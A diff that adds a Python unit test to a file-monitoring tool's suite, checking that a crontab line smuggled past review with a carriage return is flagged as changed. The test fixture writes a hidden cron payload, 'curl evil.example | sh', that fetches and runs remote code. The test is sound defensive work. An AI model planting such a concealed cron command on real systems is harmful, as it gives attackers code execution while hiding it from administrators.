@@ -102,6 +102,19 @@ class Files(unittest.TestCase):
         finally:
             self.col._root_only = real
 
+    def test_a_carriage_return_cant_hide_a_cron_line(self):
+        # cron splits on \n only; Python's universal newlines also split on \r, so "approved line\r#; payload" read
+        # as the approved line plus a comment, while cron runs the payload (audit round 2)
+        tab = os.path.join(self.tmp, "crontab")
+        with open(tab, "wb") as f:
+            f.write(b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
+        self.col.CRON_GLOBS = (tab,)
+        before = self.col.cron_files()
+        with open(tab, "wb") as f:
+            f.write(b"17 * * * * root cd / && run-parts --report /etc/cron.hourly\r#; curl evil.example | sh\n")
+        self.assertNotEqual(self.col.cron_files(), before, "the changed line must show as changed")
+        self.assertEqual(self.col.card_lines([f"line {i}" for i in range(25)])[-1], "… and 5 more lines", "nothing approved unseen")
+
     def authelia_db(self, create):
         import sqlite3
         path = os.path.join(self.tmp, "db.sqlite3")
